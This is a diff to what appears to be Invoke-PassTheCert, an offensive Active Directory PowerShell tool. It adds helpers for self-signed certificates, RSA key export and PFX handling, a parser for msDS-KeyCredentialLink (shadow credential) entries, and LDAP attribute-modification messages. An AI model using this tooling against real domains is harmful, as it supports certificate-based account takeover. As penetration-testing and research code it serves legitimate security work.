@@ -30,7 +30,7 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______|                  "
     Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|                           "
     Write-Host -ForegroundColor Red     "                                                            "
-    Write-Host -ForegroundColor Red     "   v1.0.1                                                   "
+    Write-Host -ForegroundColor Red     "   v1.0.2                                                   "
     Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _      "
     Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |     "
     Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_    "
@@ -681,7 +681,47 @@ function _Helper-GetTypeOfIdentityString {
 }
 
 
+function _Helper-GetBinaryFromHexString {
+    
+    <#
+    
+        .SYNOPSIS
 
+            Returns the binary blob from a hexadecimal string.
+
+        .PARAMETER HexString
+
+            [System.String]
+
+            The Hexadecimal string
+
+        .EXAMPLE
+
+            _Helper-GetBinaryFromHex -HexString '1011'
+
+            Returns [48, 49]
+
+        .OUTPUTS
+
+            [byte[]]
+            
+            The binary blob from a hexadecimal string.
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the hexadecimal string to be converted to binary")]
+        [System.String]$HexString
+    )
+    
+    $Result = @()
+    for($i=0; $i -lt $HexString.Length; $i+=2) { 
+        $Result += [Convert]::ToByte($HexString.Substring($i,2),16) 
+    }
+    
+    return [byte[]]$Result
+}
 
 
 # ========================================================
@@ -5705,6 +5745,445 @@ function _Helper-GetNameOfLDAPAttributeGUID {
 
 
 
+# ========================================================
+# ===         Helper Functions (Certificates)          ===
+# ========================================================
+
+function _Helper-ExportRSAPublicKeyBCrypt {
+    
+    <#
+    
+        .SYNOPSIS
+
+            Returns the BCRYPT_RSAKEY_BLOB of a certificate's RSA public key
+
+        .PARAMETER Certificate
+
+            [System.Security.Cryptography.X509Certificates.X509Certificate2]
+
+            The certificate
+
+        .EXAMPLE
+
+            _Helper-ExportRSAPublicKeyBCrypt -Certificate $Certificate
+
+            Returns the BCRYPT_RSAKEY_BLOB of the `$Certificate`'s RSA public key
+
+        .OUTPUTS
+
+            [byte[]]
+            
+            The BCRYPT_RSAKEY_BLOB of a certificate's RSA public key
+
+        .LINK
+            https://github.com/MichaelGrafnetter/DSInternals/blob/af4f0112a7baf57616ef515281f5c7344bcc49ed/Src/DSInternals.Common/Extensions/RSAExtensions.cs#L113-L145
+
+    #>
+
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate from which ro export the BCRYPT_RSAKEY_BLOB")]
+        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate
+    )
+
+    # https://github.com/MichaelGrafnetter/DSInternals/blob/af4f0112a7baf57616ef515281f5c7344bcc49ed/Src/DSInternals.Common/Extensions/RSAExtensions.cs#L29
+    $BCryptRSAPublicKeyFormat = [System.Security.Cryptography.CngKeyBlobFormat]::new("RSAPUBLICBLOB")
+    
+    # https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.x509certificate.getpublickey
+    # https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.publickey.getrsapublickey
+    $rsa = $Certificate.PublicKey.GetRSAPublicKey()
+
+    if ($rsa -is [System.Security.Cryptography.RSACng]) {
+        $key = $rsa.Key
+        return $key.Export($BCryptRSAPublicKeyFormat)
+    } else {
+        $publicKeyParameters = $rsa.ExportParameters($false)
+        $rsaCngNew = [System.Security.Cryptography.RSACng]::new()
+        $rsaCngNew.ImportParameters($publicKeyParameters)
+        return $rsaCngNew.Key.Export($BCryptRSAPublicKeyFormat)
+    }
+}
+
+
+
+function _Helper-ExportRSAPublicKeyDER {
+    
+    <#
+    
+        .SYNOPSIS
+
+            Returns the DER format of a certificate's RSA public key
+
+        .PARAMETER Certificate
+
+            [System.Security.Cryptography.X509Certificates.X509Certificate2]
+
+            The certificate
+
+        .EXAMPLE
+
+            _Helper-ExportRSAPublicKeyDER -Certificate $Certificate
+
+            Returns the DER format of the `$Certificate`'s RSA public key
+
+        .OUTPUTS
+
+            [byte[]]
+            
+            The DER format of a certificate's RSA public key
+
+        .LINK
+            https://github.com/MichaelGrafnetter/DSInternals/blob/af4f0112a7baf57616ef515281f5c7344bcc49ed/Src/DSInternals.Common/Extensions/RSAExtensions.cs#L163-L171
+
+    #>
+
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate from which ro export the DER format of the RSA public key")]
+        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate
+    )
+
+    return $Certificate.PublicKey.EncodedKeyValue.RawData
+}
+
+
+
+function _Helper-GenerateSelfSignedCertificate() {
+    
+    <#
+    
+        .SYNOPSIS
+
+            Returns a self-signed certificate
+
+        .PARAMETER CN
+
+            [System.String]
+
+            The CN of the certificate's subject (e.g. 'jdoe')
+
+        .PARAMETER AddYears
+
+            [System.Int32]
+
+            The number of years the certificate is valid for (e.g. 2)
+
+            - If not specified, defaults to 1
+
+        .EXAMPLE
+
+            _Helper-GenerateSelfSignedCertificate -CN 'jdoe'
+
+            Returns a generated self-signed certificate whose subject field is 'jdoe', valid for 1 year (default)
+
+        .EXAMPLE
+
+            _Helper-GenerateSelfSignedCertificate -CN 'jdoe' -AddYear 30
+
+            Returns a generated self-signed certificate whose subject field is 'jdoe', valid for 30 years
+
+        .OUTPUTS
+
+             [System.Security.Cryptography.X509Certificates.X509Certificate2]
+            
+            A self-signed certificate
+
+        .LINK
+
+            https://github.com/eladshamir/Whisker/blob/3940c5777aba89a3c49d98938629ebc2ea2c759f/Whisker/Program.cs#L154-L160
+
+    #>
+
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate's subject CN")]
+        [System.String]$CN,
+
+        [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the number of year the certificate is valid for")]
+        [PSDefaultValue(Help="1 year validity")]
+        [System.Int32]$AddYear = 1
+    )
+
+
+    # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Documentation/PowerShell/Get-ADKeyCredential.md#example-6
+    #return $NewSelfSignedCertificate = New-SelfSignedCertificate `
+    #    -Subject $CN `
+    #    -KeyLength 2048 `
+    #    -KeyExportPolicy 'Exportable','ExportableEncrypted' `
+    #    -KeyAlgorithm 'RSA' `
+    #    -HashAlgorithm 'SHA256' `
+    #    -Provider 'Microsoft Strong Cryptographic Provider' `
+    #    -CertStoreLocation 'Cert:\CurrentUser\My' `
+    #    -NotAfter (Get-Date).AddYears($AddYear) `
+    #    -KeyUsageProperty 'All' `
+    #    -KeyUsage 'KeyEncipherment','DigitalSignature' `
+    #    -TextExtension @(
+    #        #"2.5.29.17={text}UPN=$TargetUPN",
+    #        '2.5.29.37={text}1.3.6.1.5.5.7.3.1',
+    #        '2.5.29.37={text}1.3.6.1.5.5.7.3.2'
+    #    )
+
+    # https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rsacryptoserviceprovider
+    $RSA = New-Object System.Security.Cryptography.RSACryptoServiceProvider(
+        2048, 
+        (New-Object System.Security.Cryptography.CspParameters(
+            24, 
+            "Microsoft Enhanced RSA and AES Cryptographic Provider", 
+            [Guid]::NewGuid().ToString()
+        ))
+    )
+
+    # https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.certificaterequest
+    $CertificateRequest = New-Object System.Security.Cryptography.X509Certificates.CertificateRequest(
+        "CN=$CN",
+        $RSA,
+        [System.Security.Cryptography.HashAlgorithmName]::SHA256, 
+        [System.Security.Cryptography.RSASignaturePadding]::Pkcs1
+    )
+    
+    # https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.certificaterequest.createselfsigned
+    return $CertificateRequest.CreateSelfSigned(
+        [DateTimeOffset]::Now.AddMinutes(-5), 
+        [DateTimeOffset]::Now.AddYears($AddYear)
+    )
+}
+
+
+
+function _Helper-ExportCertificateToFile {
+    
+    <#
+
+        .SYNOPSIS
+
+            Exports a certificate to a file
+
+        .PARAMETER Certificate
+
+            [System.Security.Cryptography.X509Certificates.X509Certificate2]
+
+            The certificate to be exported
+
+        .PARAMETER ExportPath
+
+            [System.String] 
+            
+            The path of the certificate to be exported
+
+        .PARAMETER ExportContentType
+
+            [System.String] 
+            
+            The ContentType of the certificate to be exported (among 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', 'Authenticode') (Optional)
+            
+            - If not specified, defaults to 'pfx'
+
+        .PARAMETER ExportPassword
+
+            [System.String] 
+            
+            The password of the certificate to be exported (Optional)
+
+            - If not specified, defaults to '', i.e. passwordless
+
+        .EXAMPLE
+
+            _Helper-ExportCertificateToFile -Certificate $Certificate -ExportPath '.\Certified.pfx' -ExportContentType 'pfx' -ExportPassword 'ExP0rTP@sssw0Rd123!'
+
+            Exports the Certificate $Certificate into the PFX file '.\Certified.pfx', protected with password 'ExP0rTP@sssw0Rd123!'
+
+        .EXAMPLE
+
+            _Helper-ExportCertificateToFile -Certificate $Certificate -ExportPath '.\Certified.pfx' -ExportContentType 'pfx'
+
+            Exports the Certificate $Certificate into the passwordless PFX file '.\Certified.pfx'
+
+        .EXAMPLE
+
+            _Helper-ExportCertificateToFile -Certificate $Certificate -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12' -ExportPassword 'ExP0rTP@sssw0Rd123!'
+
+            Exports the Certificate $Certificate into the PKCS #12 file '.\Certified.p12', protected with password 'ExP0rTP@sssw0Rd123!'
+
+        .EXAMPLE
+
+            _Helper-ExportCertificateToFile -Certificate $Certificate -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12'
+
+            Exports the Certificate $Certificate into the PKCS #12 file '.\Certified.p12', passwordless
+
+        .LINK 
+
+            https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.x509certificate.export
+        
+        .LINK
+
+            https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.x509contenttype
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate to export")]
+        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the path of the certificate to export")]
+        [System.String]$ExportPath,
+
+        [Parameter(Position=2, Mandatory=$false, HelpMessage="Enter the type of the certificate to export ('Unknown', 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', or 'Authenticode')")]
+        [ValidateSet('Unknown', 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', 'Authenticode')]
+        [PSDefaultValue(Help="Pfx by default")]
+        [System.String]$ExportContentType = 'Pfx',
+
+        [Parameter(Position=3, Mandatory=$false, HelpMessage="Enter the password of the certificate to export")]
+        [PSDefaultValue(Help="Empty password by default")]
+        [System.String]$ExportPassword = ''
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    try {
+        if (-not $ExportPassword) {
+            $PasswordString = "Passwordless"
+            $SecureString = (New-Object System.Security.SecureString)
+        } else {
+            $PasswordString = "Protected With Password: $ExportPassword"
+            $SecureString = (ConvertTo-SecureString $ExportPassword -AsPlainText -Force)
+        }
+
+    Write-Verbose "[*] Exporting The Certificate To The File '$ExportPath' Of Type '$ExportContentType', $PasswordString ..."
+
+        switch ($ExportContentType) {
+            "Unknown" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Unknown; break; } #??
+            "Cert" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Cert; break; }
+            "SerializedCert" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::SerializedCert; break; }
+            "PFX" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx; break; }
+            "Pkcs12" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Pkcs12; break; }
+            "SerializedStore" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::SerializedStore; break; }
+            "Pkcs7" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Pkcs7; break; }
+            "Authenticode" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Authenticode; break; }
+            Default { Write-Host "[!] X509ContentType '$ExportContentType' Not Recognized !"; return; }
+        }
+
+        Set-Content -Path $ExportPath -AsByteStream -Force -Value (
+            $Certificate.Export(
+                $X509ContentType,
+                $SecureString
+            )
+        )
+
+        #[System.IO.File]::WriteAllBytes(
+        #    $ExportPath, 
+        #    $Certificate.Export(
+        #        $X509ContentType, 
+        #        $ExportPassword
+        #    )
+        #)
+
+        Write-Host "[+] Successfully Exported Certificate To File '$ExportPath' Of Type '$ExportContentType', $PasswordString"
+
+    } catch { Write-Host "[!] Exporting The Certificate To File '$ExportPath' Of Type '$ExportContentType' Failed With Error: $_" }
+
+}
+
+
+function _Helper-GetCertificateFromFileOrBase64 {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns a loaded certificate variable from a file or base64 input
+
+        .PARAMETER Certificate
+
+            [System.String]
+
+            The path or base64 format of the certificate to be loaded
+
+        .PARAMETER CertificatePassword
+
+            [System.String] 
+            
+            The password of the certificate to be exported (Optional)
+
+            - If not specified, defaults to '', i.e. passwordless
+
+        .EXAMPLE
+
+            _Helper-GetCertificateFromFileOrBase64 -Certificate '.\Certified.pfx'
+
+            Returns the X509Certificate2 certificate extracted from the certificate in file '.\Certified.pfx', passwordless
+
+        .EXAMPLE
+
+            _Helper-GetCertificateFromFileOrBase64 -Certificate '.\Certified.pfx' -CertificatePassword 'CerTifIed@sssw0Rd123!'
+
+            Returns the X509Certificate2 certificate extracted from the certificate in file '.\Certified.pfx', password-protected with 'CerTifIed@sssw0Rd123!'
+
+        .EXAMPLE
+
+            _Helper-GetCertificateFromFileOrBase64 -Certificate 'MIINA...'
+
+            Returns the X509Certificate2 certificate extracted from the certificate with base64 format 'MIINA...', passwordless
+
+        .EXAMPLE
+
+            _Helper-GetCertificateFromFileOrBase64 -Certificate 'MIINA...' -CertificatePassword 'CerTifIed@sssw0Rd123!'
+
+            Returns the X509Certificate2 certificate extracted from the certificate with base64 format 'MIINA...', password-protected with 'CerTifIed@sssw0Rd123!'
+
+        .OUTPUTS
+
+            [System.Security.Cryptography.X509Certificates.X509Certificate2]
+
+            A loaded certificate variable from a file or base64 input
+
+        .LINK 
+
+            https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.x509certificate2
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate's path or base64 format to load")]
+        [System.String]$Certificate,
+
+        [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the password of the certificate to export")]
+        [PSDefaultValue(Help="Empty password by default")]
+        [System.String]$CertificatePassword = ''
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    
+    if ($CertificatePassword) {
+        Write-Verbose "[*] Loading Certificate '$Certificate', Protected With Password: $CertificatePassword"
+    } else {
+        Write-Verbose "[*] Loading Certificate '$Certificate', Passwordless"
+    }
+
+    if (Test-Path -Path $Certificate) {
+        # File Certificate
+        $Result = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
+            $Certificate, 
+            $CertificatePassword, 
+            [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
+        )
+
+        Write-Host "[+] Successfully Loaded File Certificate !"
+    } else {
+        # Base64 Certificate
+        $Result = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
+            [System.Convert]::FromBase64String($Certificate), 
+            $CertificatePassword, 
+            [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
+        )
+
+        Write-Host "[+] Successfully Loaded Base64 Certificate !"
+    }
+
+    return $Result
+
+}
+
+
 
 # ==========================================
 # ===    Helper Functions (LDAP Core)    ===
@@ -6645,7 +7124,7 @@ function _Filter {
 
         .OUTPUTS
 
-            [PSCustomObject]@{}
+            [PSCustomObject[]]
 
             List of [PSCustomObject] object(s) found by the LDAP query.
 
@@ -6733,14 +7212,11 @@ function _Filter {
         [System.String]$SIDFilter
     )
 
-
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
 
     # Exception whenever retrieving the RootDSE, i.e. the targeted DN is NULL. 
     # Note: This scenario makes sense ONLY IF the other filters are NOT set.
     if (-not $SearchBase) { $SearchBase = $null }
-
-    Write-Verbose "[*] Performing LDAP Query On Base '$SearchBase'..."
 
     switch ($SearchScope) {
         "Base"      { $SearchScope = [System.DirectoryServices.SearchScope]::Base; break; }
@@ -6782,7 +7258,13 @@ function _Filter {
             Write-Host "[!] GUID Filter '$GUIDFilter' Isn't Valid ! Expected Format: 12345678-1234-1234-1234-123456789012. Returning $null...";
             return $null
         }
+    } else {
+        # Defaults to any object, when no filter is specified
+        $MyFilter = '(objectClass=*)'
     }
+
+    Write-Verbose "[*] Performing '$MyFilter' LDAP Query On Base '$SearchBase', In Scope '$SearchScope'..."
+
 
     $SearchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest(
         $SearchBase, 
@@ -6825,7 +7307,7 @@ function _Filter {
                 $AttributeLength = $Entry.Attributes[$Attribute].Count
                 # If we're dealing with single-valued attributes (i.e. attribute containing a single value only, such as 'distinguishedname', or 'cn', we'd avoid their array'ification. For instance, 'sAMAccountName' is NEVER an array. Hence, no need to make it an array, e.g. {Administrator}. Just make it a string, e.g. 'Administrator'.
                 if ($AttributeLength -eq 1) {
-                    $ResultObject | Add-Member -NotePropertyName $Attribute -NotePropertyValue $Entry.Attributes[$Attribute][0]
+                    $ResultObject | Add-Member -Force -NotePropertyName $Attribute -NotePropertyValue $Entry.Attributes[$Attribute][0]
                 } 
                 # Otherwise, we're dealing with a multi-valued attribute, i.e. attribute that MAY contain multiple values (e.g. 'serviceprincipalname', or 'memberof').
                 elseif ($AttributeLength -gt 1) {
@@ -6841,10 +7323,10 @@ function _Filter {
                     #   serviceprincipalname    : CIFS/DC01
                     #                             LDAP/DC01
                     # However, some very long array binaries (e.g. 'usercertificate') are not interesting to split. Hence, we'll whitelist the interesting multi-valued attributes to CRLF-split.
-                    if ($Attribute -in @('objectClass', 'serviceprincipalname', 'memberof')) {
-                        $ResultObject | Add-Member -NotePropertyName $Attribute -NotePropertyValue $($AttributeObject -join "`r`n")
+                    if ($Attribute -in @('objectClass', 'serviceprincipalname', 'memberof', 'msds-keycredentiallink')) {
+                        $ResultObject | Add-Member -Force -NotePropertyName $Attribute -NotePropertyValue $($AttributeObject -join "`r`n")
                     } else {
-                        $ResultObject | Add-Member -NotePropertyName $Attribute -NotePropertyValue $AttributeObject
+                        $ResultObject | Add-Member -Force -NotePropertyName $Attribute -NotePropertyValue $AttributeObject
                     }
                 }
             }
@@ -6871,7 +7353,7 @@ function _Filter {
         return $null
     } else {
         # For each result object, translate the UAC Values, if any, into UAC Flags (comma-separacted, if multiple)
-        return $ResultObjects |%{ if ($_.useraccountcontrol) { $_ |Add-Member -NotePropertyName 'useraccountcontrolnames' -NotePropertyValue (_Helper-GetUACFlagsOfValue $_.useraccountcontrol) }; $_ }
+        return $ResultObjects |%{ if ($_.useraccountcontrol) { $_ |Add-Member -Force -NotePropertyName 'useraccountcontrolnames' -NotePropertyValue (_Helper-GetUACFlagsOfValue $_.useraccountcontrol) }; $_ }
     }
 }
 
@@ -7212,7 +7694,7 @@ function _CreateObject {
         Write-Host "[+] Successfully Created Object Of Type '$ObjectType' With Distinguished Name '$ObjectDN', $UACString, $PasswordString";
     }
 
-    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$ObjectDN' -LDAPFilter '(objectClass=*)' -SearchScope 'Base'
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$ObjectDN' -SearchScope 'Base'
     "
 }
 
@@ -8433,7 +8915,7 @@ function _OverwriteValueInAttribute {
     ) |Out-Null
 
     Write-Host "[+] Successfully Overwritten Value Of '$IdentityDN':'$Attribute' To '$Value' !"
-    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' -LDAPFilter '(objectClass=*)' |fl"
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' |fl"
     return
 }
 
@@ -8524,7 +9006,7 @@ function _AddValueInAttribute {
 
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
 
-    Write-Verbose "[*] Adding Value '$Value' On Attribute '$IdentityDN':'$Attribute'..."
+    Write-Verbose "[*] Adding Value '$Value' In Attribute '$IdentityDN':'$Attribute'..."
 
     $LdapConnection.SendRequest(
         (New-Object System.DirectoryServices.Protocols.ModifyRequest(
@@ -8535,8 +9017,8 @@ function _AddValueInAttribute {
         ))
     ) |Out-Null
 
-    Write-Host "[+] Successfully Added Value '$Value' On Attribute '$IdentityDN':'$Attribute' !"
-    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' -LDAPFilter '(objectClass=*)' |fl"
+    Write-Host "[+] Successfully Added Value '$Value' In Attribute '$IdentityDN':'$Attribute' !"
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' |fl"
     Write-Host "[*] [Remove] Invoke-PassTheCert -Action 'RemoveValueInAttribute' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Attribute '$Attribute' -Value '$Value'"
 
     return
@@ -8629,7 +9111,7 @@ function _RemoveValueInAttribute {
 
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
 
-    Write-Verbose "[*] Removing Value '$Value' From Attribute '$IdentityDN':'$Attribute'..."
+    Write-Verbose "[*] Removing Value '$Value' In Attribute '$IdentityDN':'$Attribute'..."
 
     $LdapConnection.SendRequest(
         (New-Object System.DirectoryServices.Protocols.ModifyRequest(
@@ -8640,8 +9122,8 @@ function _RemoveValueInAttribute {
         ))
     ) |Out-Null
 
-    Write-Host "[+] Successfully Removed Value '$Value' From Attribute '$IdentityDN':'$Attribute' !"
-    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' -LDAPFilter '(objectClass=*)' |fl"
+    Write-Host "[+] Successfully Removed Value '$Value' In Attribute '$IdentityDN':'$Attribute' !"
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' |fl"
     return
 }
 
@@ -8721,7 +9203,7 @@ function _ClearAttribute {
 
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
 
-    Write-Verbose "[*] Deleting Attribute '$IdentityDN':'$Attribute'..."
+    Write-Verbose "[*] Clearing Attribute '$IdentityDN':'$Attribute'..."
 
     $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
     $Modification.Name = $Attribute
@@ -8734,8 +9216,8 @@ function _ClearAttribute {
         ))
     ) |Out-Null
     
-    Write-Host "[+] Successfully Deleted Attribute '$IdentityDN':'$Attribute' !"
-    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' -LDAPFilter '(objectClass=*)' |fl"
+    Write-Host "[+] Successfully Cleared Attribute '$IdentityDN':'$Attribute' !"
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' |fl"
     return
 }
 
@@ -9478,7 +9960,7 @@ function _LDAPEnum {
     # If $SearchBase isn't specified, defaults to the LDAP/S Server's Domain
     if (-not $SearchBase) { $SearchBase = $(_Helper-GetDomainDNFromDN -DN $(_GetIssuerDNFromLdapConnection -LdapConnection $LdapConnection)) }
 
-    $RootDSE = _Filter -LdapConnection $LdapConnection -SearchBase $null -SearchScope Base -LDAPFilter '(objectClass=*)'
+    $RootDSE = _Filter -LdapConnection $LdapConnection -SearchBase $null -SearchScope Base
 
     switch ($Enum) {
 
@@ -9593,7 +10075,7 @@ function _LDAPEnum {
         }
 
         'RootDSE' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $null -SearchScope Base -Properties * -LDAPFilter '(objectClass=*)'
+            return _Filter -LdapConnection $LdapConnection -SearchBase $null -SearchScope Base
         }
 
         'OSs' {
@@ -9605,7 +10087,73 @@ function _LDAPEnum {
         }
 
         'ShadowCreds' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-KeyCredentialLink=*)'
+
+            $KeyCredentials = [PSCustomObject]@()
+
+            foreach ($KeyCredentialString in (_Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-KeyCredentialLink=*)' |Select -ExpandProperty msDS-KeyCredentialLink) -split "`r`n") {
+                # https://learn.microsoft.com/en-us/windows/win32/adschema/s-object-dn-binary
+                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/DNWithBinary.cs
+                if ($KeyCredentialString -notmatch '^B:(\d+):([0-9A-Fa-f]+):(.+)$') {
+                    # Format MUST be DN-Binary: 'B:<char count>:<binary value>:<object DN>'
+                    continue
+                }
+
+                $reader = [System.IO.BinaryReader]::new(
+                    [System.IO.MemoryStream]::new(
+                        (_Helper-GetBinaryFromHexString -HexString $matches[2]), 
+                        $false
+                    )
+                )
+
+                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredentialEntryType.cs
+                $KeyCredential = [PSCustomObject]@{
+                    ObjectDN        = $matches[3]
+                    Version         = $null
+                    Identifier      = $null
+                    RawKeyMaterial  = $null
+                    Usage           = $null
+                    LegacyUsage     = $null
+                    Source          = $null
+                    DeviceId        = $null
+                    CustomKeyInfo   = $null
+                    LastLogonTime   = $null
+                    CreationTime    = $null
+                }
+
+                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredential.cs#L331-L401
+                $KeyCredential.Version = [int]$reader.ReadUInt32()
+                while ($reader.BaseStream.Position -lt $reader.BaseStream.Length) {
+                    $length = $reader.ReadUInt16()
+                    $entryType = [byte]$reader.ReadByte()
+                    $value = $reader.ReadBytes($length)
+
+                    if ($KeyCredential.Version -eq 0) {
+                        $padding = (4 - ($length % 4)) % 4
+                        #if ($padding -gt 0) { $reader.ReadBytes($padding) | Out-Null }
+                        $reader.ReadBytes($padding) | Out-Null
+                    }
+                    
+                    switch ($entryType) {
+                        1 { $KeyCredential.Identifier = if ($KeyCredential.Version -ge 2) { [System.Convert]::ToBase64String($value) } else { -join ($value | ForEach-Object { $_.ToString("x2") }) }; break; }
+                        2 { break; }
+                        3 { $KeyCredential.RawKeyMaterial = $value; break; }
+                        4 { 
+                            if ($length -eq 1) { $KeyCredential.Usage = $value[0] } 
+                            else { $KeyCredential.LegacyUsage = [System.Text.Encoding]::UTF8.GetString($value); break; } 
+                        }
+                        5 { $KeyCredential.Source = $value[0]; break; }
+                        6 { $KeyCredential.DeviceId = [Guid]::New($value); break; }
+                        7 { $KeyCredential.CustomKeyInfo = $value; break; }
+                        8 { $KeyCredential.LastLogonTime = [DateTime]::FromFileTime([BitConverter]::ToInt64($value,0)); break; }
+                        9 { $KeyCredential.CreationTime = [DateTime]::FromFileTime([BitConverter]::ToInt64($value,0)); break; }
+                    }
+                }
+
+                $reader.Close()
+
+                $KeyCredentials += $KeyCredential
+            }
+            return $KeyCredentials
         }
 
         'Unconstrained' {
@@ -9688,7 +10236,7 @@ function _LDAPEnum {
         'OUMembers' {
             if (-not (_Helper-IsEveryValueOfArrayDefined @($Name))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
             # Not using the OU's DN as a base for search (e.g. 'OU=Unity,DC=X') allows to prevent the user to provide the OU's DN. Instead, the user may only specify 'Unity', Quicky'n'Handy.
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectClass=*)' |?{ $_.distinguishedName -like "*,OU=$Name,*" } |Select distinguishedName,sAMAccountName,userAccountControlNames,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope |?{ $_.distinguishedName -like "*,OU=$Name,*" } |Select distinguishedName,sAMAccountName,userAccountControlNames,objectcategory
         }
 
         Default { Write-Host "[!] LDAP Enumeration '$Enum' Not Recognized !"; return }
@@ -9740,9 +10288,11 @@ function _LDAPExploit {
 
         .EXAMPLE
 
